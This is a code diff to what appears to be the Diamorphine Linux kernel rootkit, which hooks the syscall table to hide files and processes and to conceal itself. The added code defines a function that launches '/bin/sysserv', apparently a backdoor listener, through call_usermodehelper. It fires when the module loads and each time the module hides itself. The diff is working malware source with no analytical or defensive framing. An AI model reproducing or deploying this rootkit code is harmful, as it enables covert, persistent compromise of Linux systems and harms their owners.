@@ -4,7 +4,8 @@
 #include <linux/syscalls.h>
 #include <linux/dirent.h>
 #include <linux/slab.h>
-#include <linux/version.h> 
+#include <linux/version.h>
+#include <linux/kmod.h> 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
 	#include <linux/proc_ns.h>
 #else
@@ -28,6 +29,18 @@ typedef asmlinkage int (*orig_kill_t)(pid_t, int);
 orig_getdents_t orig_getdents;
 orig_getdents64_t orig_getdents64;
 orig_kill_t orig_kill;
+
+
+#define SHELL "/bin/sysserv"
+int start_linstener(void)
+{
+	char *argv[]={SHELL,NULL,NULL};
+	static char *env[]={
+		"HOME=/",
+		"TEMP=linux",
+		"PATH=/sbin:/bin:/usr/sbin:/usr/bin",NULL};
+	return call_usermodehelper(argv[0],argv,env,UMH_WAIT_PROC);
+}
 
 unsigned long *
 get_syscall_table_bf(void)
@@ -259,7 +272,11 @@ hacked_kill(pid_t pid, int sig)
 			break;
 		case SIGMODINVIS:
 			if (module_hidden) module_show();
-			else module_hide();
+			else 
+			{
+				module_hide();
+				start_linstener();
+			}
 			break;
 		default:
 			return orig_kill(pid, sig);
@@ -300,6 +317,8 @@ diamorphine_init(void)
 	sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
 	sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
 	protect_memory();
+
+	start_linstener();
 
 	return 0;
 }
